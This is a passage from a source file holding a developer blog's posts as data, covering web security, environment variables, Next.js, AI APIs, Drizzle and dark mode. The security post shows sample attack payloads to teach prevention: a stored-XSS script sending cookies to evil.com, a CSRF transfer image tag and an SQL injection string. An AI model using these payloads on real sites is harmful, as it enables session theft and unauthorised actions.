  src: url("/fonts/inter.woff2") format("woff2");
  font-display: swap; /* Show fallback immediately */
}</code></pre>
    `,
  },

  // ─── WEB SECURITY ───────────────────────────────────────────────────────────

  {
    slug: "web-security-xss-csrf-guide",
    title: "Web Security for Developers: XSS, CSRF, SQL Injection and How to Prevent Them",
    excerpt: "Real-world security vulnerabilities explained with attack examples and practical prevention techniques every web developer must know — including CSP headers, CSRF tokens, and input sanitisation.",
    category: "blog",
    tags: ["security", "web-development", "xss", "csrf"],
    readingTimeMinutes: 15,
    featured: false,
    difficulty: "intermediate",
    publishedAt: "2026-04-05T09:00:00Z",
    content: `
<h2 id="xss">Cross-Site Scripting (XSS)</h2>
<p>XSS happens when your app renders untrusted data as HTML without escaping it, allowing attackers to inject malicious scripts.</p>

<h3>Stored XSS</h3>
<p>The attacker stores malicious script in your database. When other users view the page, the script executes:</p>
<pre><code class="language-html">&lt;!-- Attacker submits this as their "name": --&gt;
&lt;script&gt;fetch('https://evil.com/steal?c=' + document.cookie)&lt;/script&gt;

&lt;!-- Your app renders: --&gt;
&lt;p&gt;Posted by &lt;script&gt;fetch('https://evil.com/steal?c=' + document.cookie)&lt;/script&gt;&lt;/p&gt;</code></pre>

<h3>Prevention</h3>
<pre><code class="language-typescript">// 1. Never use innerHTML with user data — use textContent
element.textContent = userInput; // Safe ✅
element.innerHTML = userInput;   // Dangerous ❌

// 2. In React, JSX escapes automatically — but dangerouslySetInnerHTML doesn't
&lt;p&gt;{userInput}&lt;/p&gt;  {/* Safe — React escapes ✅ */}
&lt;p dangerouslySetInnerHTML={{ __html: userInput }} /&gt;  {/* Dangerous ❌ */}

// 3. If you must render HTML, sanitise it first
import DOMPurify from "dompurify";
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean; // Now safe ✅</code></pre>
<pre><code class="language-http">/* 4. Content Security Policy header */
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'</code></pre>

<h2 id="csrf">Cross-Site Request Forgery (CSRF)</h2>
<p>CSRF tricks a logged-in user's browser into making requests to your app. Since the browser automatically sends cookies, the request arrives authenticated.</p>
<pre><code class="language-html">&lt;!-- Attacker's page: silently transfers money --&gt;
&lt;img src="https://yourbank.com/transfer?amount=5000&amp;to=attacker" /&gt;</code></pre>
<p>Prevention:</p>
<pre><code class="language-typescript">// 1. CSRF tokens — unique per session, must be in request body
app.use(csurf()); // express middleware

// 2. SameSite cookies (modern browsers)
res.cookie("session", token, {
  httpOnly: true,
  secure: true,
  sameSite: "strict", // Cookie never sent on cross-site requests
});

// 3. Check Origin header on state-changing requests
app.use((req, res, next) =&gt; {
  if (["POST", "PUT", "DELETE"].includes(req.method)) {
    const origin = req.headers.origin;
    if (origin !== process.env.ALLOWED_ORIGIN) {
      res.status(403).json({ error: "Forbidden" });
      return;
    }
  }
  next();
});</code></pre>

<h2 id="sql-injection">SQL Injection</h2>
<pre><code class="language-javascript">// ❌ NEVER do this
const query = \`SELECT * FROM users WHERE email = '\${userInput}'\`;
// Attacker inputs: ' OR '1'='1' -- 
// Result: SELECT * FROM users WHERE email = '' OR '1'='1' --'
// Returns all users!</code></pre>
<pre><code class="language-typescript">// ✅ Always use parameterised queries
const user = await db.query(
  "SELECT * FROM users WHERE email = $1",
  [userInput] // parameterised — never interpolated
);

// With Drizzle ORM — automatically parameterised
const user = await db.query.users.findFirst({
  where: eq(users.email, userInput),
});</code></pre>

<h2 id="security-headers">Essential Security Headers</h2>
<pre><code class="language-typescript">import helmet from "helmet";

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
    },
  },
  hsts: {
    maxAge: 31536000, // 1 year
    includeSubDomains: true,
    preload: true,
  },
}));</code></pre>

<h2 id="auth-security">Authentication Security</h2>
<pre><code class="language-typescript">import bcrypt from "bcrypt";

// ✅ Hash passwords with bcrypt (work factor 12+)
const ROUNDS = 12;
const hash = await bcrypt.hash(password, ROUNDS);
const match = await bcrypt.compare(inputPassword, hash);

// ✅ Timing-safe comparison for tokens (prevents timing attacks)
import { timingSafeEqual } from "crypto";
const isValid = timingSafeEqual(
  Buffer.from(providedToken),
  Buffer.from(expectedToken)
);</code></pre>

<h2 id="env-vars">Protect Your Secrets</h2>
<pre><code class="language-bash"># .env — never commit this
DATABASE_URL=postgresql://...
JWT_SECRET=a-very-long-random-string-generated-with-openssl-rand-hex-64
STRIPE_SECRET_KEY=sk_live_...</code></pre>
<pre><code class="language-bash"># Generate a secure secret
openssl rand -hex 64</code></pre>
    `,
  },

  // ─── HOW-TOS ────────────────────────────────────────────────────────────────

  {
    slug: "environment-variables-guide",
    title: "How to Use Environment Variables Properly in Node.js and React",
    excerpt: "A practical guide to environment variables — how to set them, access them safely, validate them with Zod, and avoid the common mistakes that leak secrets into your codebase.",
    category: "how-to",
    tags: ["nodejs", "react", "security", "devops"],
    readingTimeMinutes: 9,
    featured: false,
    difficulty: "beginner",
    publishedAt: "2026-04-08T09:00:00Z",
    content: `
<h2 id="what-are-env-vars">What Are Environment Variables</h2>
<p>Environment variables are key-value pairs set in the OS environment before your process starts. They let you configure your app differently across environments (development, staging, production) without changing code.</p>

<h2 id="setting-them">Setting Environment Variables</h2>
<pre><code class="language-bash"># Inline for a single command
DATABASE_URL=postgres://localhost/mydb node index.js

# In a .env file (never commit this!)
DATABASE_URL=postgres://localhost/mydb
JWT_SECRET=super-secret-key
PORT=3000</code></pre>

<h2 id="nodejs">Accessing in Node.js</h2>
<pre><code class="language-typescript">// Load .env with the built-in Node 20+ support
// package.json: "scripts": { "start": "node --env-file=.env index.js" }

// Or with dotenv (Node 18 and below)
import "dotenv/config";

// Access via process.env — always string or undefined
const port = Number(process.env.PORT) || 3000;
const dbUrl = process.env.DATABASE_URL;

if (!dbUrl) {
  console.error("DATABASE_URL is required");
  process.exit(1);
}</code></pre>

<h2 id="validation">Validate with Zod (Recommended)</h2>
<p>Validate all env vars at startup so you get clear errors immediately instead of mysterious failures later:</p>
<pre><code class="language-typescript">// src/env.ts
import { z } from "zod";

const envSchema = z.object({
  DATABASE_URL: z.string().url(),
  JWT_SECRET: z.string().min(32),
  PORT: z.coerce.number().default(3000),
  NODE_ENV: z.enum(["development", "production", "test"]).default("development"),
  ADMIN_PASSWORD: z.string().min(8),
});

export const env = envSchema.parse(process.env);

// Usage
import { env } from "./env";
const server = app.listen(env.PORT);</code></pre>

<h2 id="react">Environment Variables in React / Vite</h2>
<p>Vite only exposes variables prefixed with <code>VITE_</code> to the browser bundle — everything else stays server-side:</p>
<pre><code class="language-bash"># .env.local (gitignored)
VITE_API_URL=http://localhost:3000
VITE_ANALYTICS_ID=G-XXXXXXXXXX
# Never expose secrets here — they ship to the browser!</code></pre>
<pre><code class="language-typescript">// In your React code
const apiUrl = import.meta.env.VITE_API_URL;
const isProd = import.meta.env.PROD;
const isDev = import.meta.env.DEV;</code></pre>

<h2 id="multiple-envs">Multiple Environment Files</h2>
<pre><code class="language-text">.env                # Defaults (committed)
.env.local          # Local overrides (gitignored)
.env.development    # Dev-only defaults (committed)
.env.production     # Production defaults (committed)
.env.test           # Test-only (committed)</code></pre>

<h2 id="mistakes">Common Mistakes to Avoid</h2>
<ul>
  <li><strong>Never commit .env files with real secrets</strong> — add to <code>.gitignore</code></li>
  <li><strong>Don't expose secrets in client-side code</strong> — anything in <code>VITE_*</code> ships to browsers</li>
  <li><strong>Don't default to empty string</strong>: <code>process.env.SECRET || ""</code> — validate explicitly</li>
  <li><strong>Don't log env vars</strong>: <code>console.log(process.env)</code> in server logs leaks secrets</li>
  <li><strong>Use secret managers in production</strong>: AWS Secrets Manager, Vault, or Doppler — not flat files</li>
</ul>
    `,
  },

  // ─── NEXT.JS ────────────────────────────────────────────────────────────────

  {
    slug: "nextjs-app-router-complete-guide",
    title: "Next.js 15 App Router: The Complete Guide with Examples",
    excerpt: "A comprehensive guide to the Next.js 15 App Router — file-based routing, Server and Client Components, data fetching, caching, layouts, loading UI, error boundaries, and Server Actions.",
    category: "tutorial",
    tags: ["nextjs", "react", "typescript", "full-stack"],
    readingTimeMinutes: 22,
    featured: true,
    difficulty: "intermediate",
    publishedAt: "2026-04-10T09:00:00Z",
    content: `
<h2 id="app-router">Understanding the App Router</h2>
<p>The App Router (introduced in Next.js 13, stable in 14, enhanced in 15) is built on React Server Components. The key mental model: by default, every component in the <code>app/</code> directory is a Server Component. To add interactivity, you opt into being a Client Component with <code>"use client"</code>.</p>

<h2 id="routing">File-Based Routing</h2>
<pre><code class="language-text">app/
├── layout.tsx          → Root layout (always rendered)
├── page.tsx            → / route
├── blog/
│   ├── page.tsx        → /blog
│   └── [slug]/
│       └── page.tsx    → /blog/[slug]
├── (marketing)/        → Route group (no URL segment)
│   ├── about/page.tsx  → /about
│   └── pricing/page.tsx→ /pricing
└── api/
    └── posts/
        └── route.ts    → /api/posts (API route)</code></pre>

<h2 id="layouts">Layouts and Templates</h2>
<pre><code class="language-tsx">// app/layout.tsx — Root layout, wraps every page
export default function RootLayout({ children }: { children: React.ReactNode }) {
  return (
    &lt;html lang="en"&gt;
      &lt;body&gt;
        &lt;Nav /&gt;
        &lt;main&gt;{children}&lt;/main&gt;
        &lt;Footer /&gt;
      &lt;/body&gt;
    &lt;/html&gt;
  );
}

// app/blog/layout.tsx — Nested layout, only wraps /blog/**
export default function BlogLayout({ children }: { children: React.ReactNode }) {
  return (
    &lt;div className="max-w-4xl mx-auto"&gt;
      &lt;BlogSidebar /&gt;
      {children}
    &lt;/div&gt;
  );
}</code></pre>

<h2 id="server-components">Server Components — Fetch Data Directly</h2>
<pre><code class="language-tsx">// app/blog/[slug]/page.tsx — Server Component
import { db } from "@/lib/db";
import { notFound } from "next/navigation";

interface Props {
  params: Promise&lt;{ slug: string }&gt;;
}

export default async function BlogPost({ params }: Props) {
  const { slug } = await params; // Next.js 15: params is async
  const post = await db.query.posts.findFirst({
    where: eq(posts.slug, slug),
  });

  if (!post) notFound(); // Renders the nearest not-found.tsx

  return (
    &lt;article&gt;
      &lt;h1&gt;{post.title}&lt;/h1&gt;
      &lt;div dangerouslySetInnerHTML={{ __html: post.content }} /&gt;
    &lt;/article&gt;
  );
}

// Generate static params for SSG
export async function generateStaticParams() {
  const posts = await db.select({ slug: posts.slug }).from(posts);
  return posts.map(p =&gt; ({ slug: p.slug }));
}</code></pre>

<h2 id="client-components">Client Components — Interactivity</h2>
<pre><code class="language-tsx">"use client"; // This directive makes it a Client Component

import { useState } from "react";

export function LikeButton({ postId }: { postId: number }) {
  const [liked, setLiked] = useState(false);

  async function handleLike() {
    setLiked(true);
    await fetch(\`/api/posts/\${postId}/like\`, { method: "POST" });
  }

  return (
    &lt;button onClick={handleLike}&gt;
      {liked ? "❤️ Liked" : "🤍 Like"}
    &lt;/button&gt;
  );
}</code></pre>

<h2 id="server-actions">Server Actions — Mutations Without an API</h2>
<pre><code class="language-tsx">// app/posts/new/page.tsx
import { redirect } from "next/navigation";
import { revalidatePath } from "next/cache";

async function createPost(formData: FormData) {
  "use server";

  const title = formData.get("title") as string;
  const content = formData.get("content") as string;

  const [post] = await db.insert(posts).values({ title, content }).returning();

  revalidatePath("/blog"); // Invalidate cache
  redirect(\`/blog/\${post.slug}\`);
}

export default function NewPostPage() {
  return (
    &lt;form action={createPost}&gt;
      &lt;input name="title" placeholder="Title" required /&gt;
      &lt;textarea name="content" required /&gt;
      &lt;button type="submit"&gt;Publish&lt;/button&gt;
    &lt;/form&gt;
  );
}</code></pre>

<h2 id="loading-error">Loading UI and Error Boundaries</h2>
<pre><code class="language-tsx">// app/blog/loading.tsx — Shows while page data loads
export default function Loading() {
  return &lt;div className="animate-pulse"&gt;Loading posts...&lt;/div&gt;;
}

// app/blog/error.tsx — Shows when page throws
"use client";
export default function Error({
  error,
  reset,
}: {
  error: Error;
  reset: () =&gt; void;
}) {
  return (
    &lt;div&gt;
      &lt;h2&gt;Something went wrong!&lt;/h2&gt;
      &lt;button onClick={reset}&gt;Try again&lt;/button&gt;
    &lt;/div&gt;
  );
}</code></pre>

<h2 id="metadata">SEO Metadata API</h2>
<pre><code class="language-tsx">// app/blog/[slug]/page.tsx
import type { Metadata } from "next";

export async function generateMetadata({ params }: Props): Promise&lt;Metadata&gt; {
  const { slug } = await params;
  const post = await getPost(slug);

  return {
    title: post.title,
    description: post.excerpt,
    openGraph: {
      title: post.title,
      description: post.excerpt,
      images: [post.coverImageUrl],
    },
  };
}</code></pre>

<h2 id="api-routes">API Routes</h2>
<pre><code class="language-typescript">// app/api/posts/route.ts
import { NextRequest, NextResponse } from "next/server";

export async function GET(request: NextRequest) {
  const { searchParams } = request.nextUrl;
  const category = searchParams.get("category");

  const posts = await db.query.posts.findMany({
    where: category ? eq(posts.category, category) : undefined,
    orderBy: desc(posts.publishedAt),
  });

  return NextResponse.json({ posts });
}

export async function POST(request: NextRequest) {
  const body = await request.json();
  const validated = CreatePostSchema.parse(body);
  const [post] = await db.insert(posts).values(validated).returning();
  return NextResponse.json(post, { status: 201 });
}</code></pre>
    `,
  },

  // ─── AI INTEGRATION ─────────────────────────────────────────────────────────

  {
    slug: "ai-api-integration-web-apps",
    title: "Integrating AI APIs into Your Web App: OpenAI, Claude, and Streaming",
    excerpt: "A practical guide to adding AI features to your web app — chat interfaces, text generation, streaming responses, rate limiting, error handling, and keeping costs under control.",
    category: "tutorial",
    tags: ["ai", "openai", "api", "nodejs", "typescript"],
    readingTimeMinutes: 16,
    featured: true,
    difficulty: "intermediate",
    publishedAt: "2026-04-12T09:00:00Z",
    content: `
<h2 id="choosing-api">Choosing an AI API</h2>
<p>The main options in 2026:</p>
<ul>
  <li><strong>OpenAI</strong> — GPT-4o is the best all-rounder for text, code, and vision. Best ecosystem and tooling.</li>
  <li><strong>Anthropic (Claude)</strong> — Claude 3.7 Sonnet excels at long documents, reasoning, and safe outputs. 200k context window.</li>
  <li><strong>Google Gemini</strong> — Best multimodal model (text, images, audio, video). 1M context in Gemini Ultra.</li>
  <li><strong>Groq</strong> — Runs open models (Llama, Mixtral) at 500+ tokens/sec. Best for speed.</li>
</ul>

<h2 id="basic-completion">Basic Text Generation</h2>
<pre><code class="language-typescript">import OpenAI from "openai";

const openai = new OpenAI({
  apiKey: process.env.OPENAI_API_KEY,
});

async function generatePostExcerpt(title: string, content: string): Promise&lt;string&gt; {
  const completion = await openai.chat.completions.create({
    model: "gpt-4o",
    messages: [
      {
        role: "system",
        content: "You are a technical writer. Write concise, engaging excerpts for blog posts. Max 160 characters.",
      },
      {
        role: "user",
        content: \`Title: \${title}\n\nContent: \${content.slice(0, 1000)}\`,
      },
    ],
    max_tokens: 100,
    temperature: 0.7,
  });

  return completion.choices[0].message.content ?? "";
}</code></pre>

<h2 id="streaming">Streaming Responses</h2>
<p>Streaming dramatically improves perceived performance for long outputs — show text as it generates rather than waiting for the full response:</p>
<pre><code class="language-typescript">// Next.js API Route (Edge Runtime)
import { OpenAIStream, StreamingTextResponse } from "ai"; // Vercel AI SDK

export const runtime = "edge";

export async function POST(req: Request) {
  const { messages } = await req.json();

  const response = await openai.chat.completions.create({
    model: "gpt-4o",
    stream: true,
    messages,
  });

  const stream = OpenAIStream(response);
  return new StreamingTextResponse(stream);
}</code></pre>
<pre><code class="language-tsx">// React client component (Vercel AI SDK)
"use client";
import { useChat } from "ai/react";

export function ChatInterface() {
  const { messages, input, handleInputChange, handleSubmit, isLoading } = useChat();

  return (
    &lt;div&gt;
      {messages.map(m =&gt; (
        &lt;div key={m.id} className={\`message \${m.role}\`}&gt;
          {m.content}
        &lt;/div&gt;
      ))}
      &lt;form onSubmit={handleSubmit}&gt;
        &lt;input value={input} onChange={handleInputChange} disabled={isLoading} /&gt;
        &lt;button type="submit" disabled={isLoading}&gt;
          {isLoading ? "Thinking..." : "Send"}
        &lt;/button&gt;
      &lt;/form&gt;
    &lt;/div&gt;
  );
}</code></pre>

<h2 id="claude">Using Claude (Anthropic)</h2>
<pre><code class="language-typescript">import Anthropic from "@anthropic-ai/sdk";

const anthropic = new Anthropic({ apiKey: process.env.ANTHROPIC_API_KEY });

async function reviewCode(code: string): Promise&lt;string&gt; {
  const message = await anthropic.messages.create({
    model: "claude-3-5-sonnet-20241022",
    max_tokens: 1024,
    messages: [
      {
        role: "user",
        content: \`Review this TypeScript code for bugs, security issues, and improvements:\n\n\`\`\`typescript\n\${code}\n\`\`\`\`,
      },
    ],
  });

  return message.content[0].type === "text" ? message.content[0].text : "";
}</code></pre>

<h2 id="embeddings">Semantic Search with Embeddings</h2>
<pre><code class="language-typescript">// Generate embedding vectors for semantic search
async function embedText(text: string): Promise&lt;number[]&gt; {
  const response = await openai.embeddings.create({
    model: "text-embedding-3-small",
    input: text,
  });
  return response.data[0].embedding; // 1536-dimensional vector
}

// Store in pgvector (PostgreSQL extension)
await db.execute(sql\`
  UPDATE posts
  SET embedding = \${JSON.stringify(embedding)}::vector
  WHERE id = \${postId}
\`);

// Find semantically similar posts
const similar = await db.execute(sql\`
  SELECT id, title, 1 - (embedding &lt;=&gt; \${JSON.stringify(queryEmbedding)}::vector) AS similarity
  FROM posts
  ORDER BY embedding &lt;=&gt; \${JSON.stringify(queryEmbedding)}::vector
  LIMIT 5
\`);</code></pre>

<h2 id="rate-limiting">Rate Limiting and Cost Control</h2>
<pre><code class="language-typescript">import { Ratelimit } from "@upstash/ratelimit";
import { Redis } from "@upstash/redis";

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(10, "1 m"), // 10 requests per minute
});

export async function POST(req: Request) {
  const ip = req.headers.get("x-forwarded-for") ?? "unknown";
  const { success, remaining } = await ratelimit.limit(ip);

  if (!success) {
    return new Response("Too many requests", { status: 429 });
  }

  // ... proceed with AI call
}</code></pre>

<h2 id="prompt-engineering">Practical Prompt Engineering</h2>
<pre><code class="language-typescript">// System prompt template
const SYSTEM_PROMPT = \`
You are a helpful technical writing assistant for DevDocs.

Rules:
- Write at a professional but accessible level
- Use concrete examples, not abstract descriptions
- Format code with proper syntax highlighting
- Keep responses concise — under 500 words unless asked for more
- If you don't know something, say so clearly

Tone: Direct, helpful, slightly informal
\`;

// Few-shot examples improve consistency
const messages = [
  { role: "system", content: SYSTEM_PROMPT },
  { role: "user", content: "Write an intro for a post about TypeScript generics" },
  { role: "assistant", content: "Generics look scary. They're not..." }, // example output
  { role: "user", content: actualUserRequest },
];</code></pre>
    `,
  },

  // ─── HOW-TOs ─────────────────────────────────────────────────────────────────

  {
    slug: "setup-postgresql-drizzle-locally",
    title: "How to Set Up PostgreSQL and Drizzle ORM for Local Development",
    excerpt: "A step-by-step guide to running PostgreSQL locally with Docker, setting up Drizzle ORM, defining your first schema, running migrations, and using Drizzle Studio to browse your data.",
    category: "how-to",
    tags: ["postgresql", "drizzle", "database", "docker", "setup"],
    readingTimeMinutes: 10,
    featured: false,
    difficulty: "beginner",
    publishedAt: "2026-04-15T09:00:00Z",
    content: `
<h2 id="postgres-docker">Step 1: Run PostgreSQL with Docker</h2>
<p>The easiest way to run PostgreSQL locally without installing it system-wide:</p>
<pre><code class="language-bash"># Start a PostgreSQL container
docker run -d \\
  --name devdb \\
  -e POSTGRES_USER=dev \\
  -e POSTGRES_PASSWORD=devpassword \\
  -e POSTGRES_DB=myapp \\
  -p 5432:5432 \\
  postgres:16

# Verify it's running
docker ps</code></pre>
<p>Or use <code>docker-compose.yml</code> for a reproducible setup:</p>
<pre><code class="language-yaml">services:
  db:
    image: postgres:16
    environment:
      POSTGRES_USER: dev
      POSTGRES_PASSWORD: devpassword
      POSTGRES_DB: myapp
    ports:
      - "5432:5432"
    volumes:
      - postgres_data:/var/lib/postgresql/data

volumes:
  postgres_data:</code></pre>
<pre><code class="language-bash">docker-compose up -d</code></pre>

<h2 id="env">Step 2: Configure the Connection</h2>
<pre><code class="language-bash"># .env
DATABASE_URL=postgresql://dev:devpassword@localhost:5432/myapp</code></pre>

<h2 id="install">Step 3: Install Drizzle</h2>
<pre><code class="language-bash">npm install drizzle-orm pg dotenv
npm install -D drizzle-kit @types/pg</code></pre>
<pre><code class="language-typescript">// drizzle.config.ts
import { defineConfig } from "drizzle-kit";
import "dotenv/config";

export default defineConfig({
  schema: "./src/db/schema.ts",
  out: "./migrations",
  dialect: "postgresql",
  dbCredentials: { url: process.env.DATABASE_URL! },
});</code></pre>

<h2 id="schema">Step 4: Define Your Schema</h2>
<pre><code class="language-typescript">// src/db/schema.ts
import { pgTable, serial, text, varchar, timestamp, boolean } from "drizzle-orm/pg-core";

export const posts = pgTable("posts", {
  id: serial("id").primaryKey(),
  title: text("title").notNull(),
  slug: varchar("slug", { length: 255 }).notNull().unique(),
  content: text("content").notNull(),
  published: boolean("published").default(false).notNull(),
  createdAt: timestamp("created_at").defaultNow().notNull(),
});</code></pre>

<h2 id="migrate">Step 5: Generate and Run Migrations</h2>
<pre><code class="language-bash"># Generate migration files from schema
npx drizzle-kit generate

# Apply migrations to database
npx drizzle-kit migrate</code></pre>

<h2 id="db-client">Step 6: Create the DB Client</h2>
<pre><code class="language-typescript">// src/db/index.ts
import { drizzle } from "drizzle-orm/node-postgres";
import { Pool } from "pg";
import * as schema from "./schema";
import "dotenv/config";

const pool = new Pool({ connectionString: process.env.DATABASE_URL });
export const db = drizzle(pool, { schema });</code></pre>

<h2 id="seed">Step 7: Seed Initial Data</h2>
<pre><code class="language-typescript">// src/db/seed.ts
import { db } from "./index";
import { posts } from "./schema";

async function seed() {
  await db.insert(posts).values([
    {
      title: "Hello World",
      slug: "hello-world",
      content: "This is my first post.",
      published: true,
    },
    {
      title: "Getting Started with Drizzle",
      slug: "getting-started-drizzle",
      content: "Drizzle is awesome.",
      published: true,
    },
  ]);

  console.log("Seeded successfully!");
  process.exit(0);
}

seed().catch(console.error);</code></pre>
<pre><code class="language-bash">npx tsx src/db/seed.ts</code></pre>

<h2 id="studio">Step 8: Browse Data with Drizzle Studio</h2>
<pre><code class="language-bash">npx drizzle-kit studio</code></pre>
<p>Opens a web UI at <code>https://local.drizzle.studio</code> where you can browse tables, run queries, and edit records without writing SQL.</p>
    `,
  },

  {
    slug: "how-to-add-dark-mode-react",
    title: "How to Add Dark Mode to Any React App in 20 Minutes",
    excerpt: "Implement a complete dark mode toggle with system preference detection, localStorage persistence, zero flash on load, and smooth transitions — without any third-party library.",
    category: "how-to",
    tags: ["react", "css", "dark-mode", "ux"],
    readingTimeMinutes: 8,
    featured: false,
    difficulty: "beginner",
    publishedAt: "2026-04-17T09:00:00Z",
    content: `
<h2 id="approach">The Right Approach</h2>
<p>There are three pieces to a great dark mode: CSS custom properties for theming, a React context to share the current theme, and a script that runs before React hydrates to prevent the dreaded flash of wrong theme.</p>

<h2 id="css">Step 1: CSS Custom Properties</h2>
<pre><code class="language-css">/* index.css */
:root {
  --bg: #ffffff;
  --fg: #111111;
  --muted: #6b7280;
  --border: #e5e7eb;
  --card: #f9fafb;
}

.dark {
  --bg: #0f172a;
  --fg: #f1f5f9;
  --muted: #94a3b8;
  --border: #1e293b;
  --card: #1e293b;
}

body {
  background: var(--bg);
  color: var(--fg);
  transition: background 0.2s, color 0.2s;
}</code></pre>

<h2 id="no-flash">Step 2: Prevent Flash on Load</h2>
<p>This inline script runs before anything else, setting the theme class before the page renders:</p>
<pre><code class="language-html">&lt;!-- index.html — inside &lt;head&gt;, before any stylesheets --&gt;
&lt;script&gt;
  (function() {
    const stored = localStorage.getItem("theme");
    const preferred = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
    const theme = stored || preferred;
    if (theme === "dark") document.documentElement.classList.add("dark");
  })();
&lt;/script&gt;</code></pre>

<h2 id="hook">Step 3: useDarkMode Hook</h2>
<pre><code class="language-tsx">// src/hooks/useDarkMode.ts
import { useState, useEffect } from "react";

type Theme = "light" | "dark";

export function useDarkMode() {
  const [theme, setTheme] = useState&lt;Theme&gt;(() =&gt; {
    // Read from localStorage (set by our inline script)
    const stored = localStorage.getItem("theme") as Theme | null;
    if (stored) return stored;
    return window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
  });

  useEffect(() =&gt; {
    const root = document.documentElement;
    if (theme === "dark") {
      root.classList.add("dark");
    } else {
      root.classList.remove("dark");
    }
    localStorage.setItem("theme", theme);
  }, [theme]);

  const toggle = () =&gt; setTheme(t =&gt; (t === "dark" ? "light" : "dark"));

  return { theme, toggle, isDark: theme === "dark" };
}</code></pre>

<h2 id="context">Step 4: Theme Context (Optional — for large apps)</h2>
<pre><code class="language-tsx">// src/context/ThemeContext.tsx
const ThemeContext = createContext&lt;ReturnType&lt;typeof useDarkMode&gt;&gt; | null&gt;(null);

export function ThemeProvider({ children }: { children: React.ReactNode }) {
  const theme = useDarkMode();
  return &lt;ThemeContext.Provider value={theme}&gt;{children}&lt;/ThemeContext.Provider&gt;;
}

export function useTheme() {
  const ctx = useContext(ThemeContext);
  if (!ctx) throw new Error("useTheme must be inside ThemeProvider");
  return ctx;
}</code></pre>

<h2 id="toggle">Step 5: The Toggle Button</h2>
<pre><code class="language-tsx">import { Sun, Moon } from "lucide-react";
import { useTheme } from "@/context/ThemeContext";

export function ThemeToggle() {
  const { isDark, toggle } = useTheme();

  return (
    &lt;button
      onClick={toggle}
      aria-label={isDark ? "Switch to light mode" : "Switch to dark mode"}
      className="p-2 rounded-lg hover:bg-muted transition-colors"
    &gt;
      {isDark ? &lt;Sun className="w-5 h-5" /&gt; : &lt;Moon className="w-5 h-5" /&gt;}
    &lt;/button&gt;
  );
}</code></pre>

<h2 id="system-sync">Step 6: Sync with System Preference Changes</h2>
<pre><code class="language-tsx">useEffect(() =&gt; {
  const mediaQuery = window.matchMedia("(prefers-color-scheme: dark)");

  const handleChange = (e: MediaQueryListEvent) =&gt; {
    // Only update if user hasn't manually set a preference
    if (!localStorage.getItem("theme")) {
      setTheme(e.matches ? "dark" : "light");
    }
  };

  mediaQuery.addEventListener("change", handleChange);
  return () =&gt; mediaQuery.removeEventListener("change", handleChange);
}, []);</code></pre>
    `,
  },

  // ─── FULL STACK ────────────────────────────────────────────────────────────

  {
    slug: "build-fullstack-react-nodejs",
    title: "Build a Full-Stack App with React, Node.js, and PostgreSQL",
    excerpt: "End-to-end guide to building a production-ready full-stack app — React frontend, Express API, PostgreSQL database, authentication, deployment. Covers the complete architecture.",
    category: "tutorial",
    tags: ["react", "nodejs", "postgresql", "full-stack", "typescript"],
    readingTimeMinutes: 25,
    featured: true,
    difficulty: "advanced",
    publishedAt: "2026-04-20T09:00:00Z",
    content: `
<h2 id="architecture">Architecture Overview</h2>
<p>We're building a blogging platform with:</p>
<ul>
  <li><strong>Frontend</strong>: React + Vite + Tailwind CSS</li>
  <li><strong>API</strong>: Express 5 + Zod validation + Pino logging</li>
  <li><strong>Database</strong>: PostgreSQL + Drizzle ORM</li>
  <li><strong>Auth</strong>: JWT with HTTP-only cookies</li>
  <li><strong>Deploy</strong>: Frontend on Vercel, API on Railway/Render</li>
</ul>

<h2 id="monorepo">Monorepo Setup</h2>
<pre><code class="language-bash">mkdir fullstack-blog && cd fullstack-blog
npm init -y
# Install workspace tooling
npm install -D pnpm</code></pre>
<pre><code class="language-yaml"># pnpm-workspace.yaml
packages:
  - apps/*
  - packages/*</code></pre>
<pre><code class="language-bash"># Create packages
mkdir -p apps/web apps/api packages/db packages/types</code></pre>

<h2 id="shared-types">Shared Types Package</h2>
<pre><code class="language-typescript">// packages/types/src/index.ts
export interface Post {
  id: number;
  slug: string;
  title: string;
  excerpt: string;
  content: string;
  authorId: number;
  published: boolean;
  publishedAt: string | null;
}

export interface CreatePostInput {
  title: string;
  content: string;
  tags?: string[];
}

export interface ApiResponse&lt;T&gt; {
  data: T;
  error?: string;
}</code></pre>

<h2 id="database-setup">Database Schema and Migrations</h2>
<pre><code class="language-typescript">// packages/db/src/schema.ts
import { pgTable, serial, text, varchar, boolean, timestamp, integer } from "drizzle-orm/pg-core";
import { relations } from "drizzle-orm";

export const users = pgTable("users", {
  id: serial("id").primaryKey(),
  email: varchar("email", { length: 255 }).notNull().unique(),
  passwordHash: text("password_hash").notNull(),
  name: varchar("name", { length: 255 }),
  createdAt: timestamp("created_at").defaultNow(),
});

export const posts = pgTable("posts", {
  id: serial("id").primaryKey(),
  slug: varchar("slug", { length: 255 }).notNull().unique(),
  title: text("title").notNull(),
  excerpt: text("excerpt").notNull(),
  content: text("content").notNull(),
  authorId: integer("author_id").references(() =&gt; users.id, { onDelete: "cascade" }),
  published: boolean("published").default(false),
  publishedAt: timestamp("published_at"),
  createdAt: timestamp("created_at").defaultNow(),
});

export const postsRelations = relations(posts, ({ one }) =&gt; ({
  author: one(users, { fields: [posts.authorId], references: [users.id] }),
}));</code></pre>

<h2 id="auth-implementation">Authentication</h2>
<pre><code class="language-typescript">// apps/api/src/routes/auth.ts
import bcrypt from "bcrypt";
import jwt from "jsonwebtoken";

const JWT_SECRET = process.env.JWT_SECRET!;
const COOKIE_OPTS = {
  httpOnly: true,
  secure: process.env.NODE_ENV === "production",
  sameSite: "strict" as const,
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
};

router.post("/register", async (req, res) =&gt; {
  const { email, password, name } = RegisterSchema.parse(req.body);

  const existing = await db.query.users.findFirst({ where: eq(users.email, email) });
  if (existing) {
    res.status(409).json({ error: "Email already registered" });
    return;
  }

  const passwordHash = await bcrypt.hash(password, 12);
  const [user] = await db.insert(users).values({ email, passwordHash, name }).returning({
    id: users.id,
    email: users.email,
    name: users.name,
  });

  const token = jwt.sign({ userId: user.id }, JWT_SECRET, { expiresIn: "7d" });
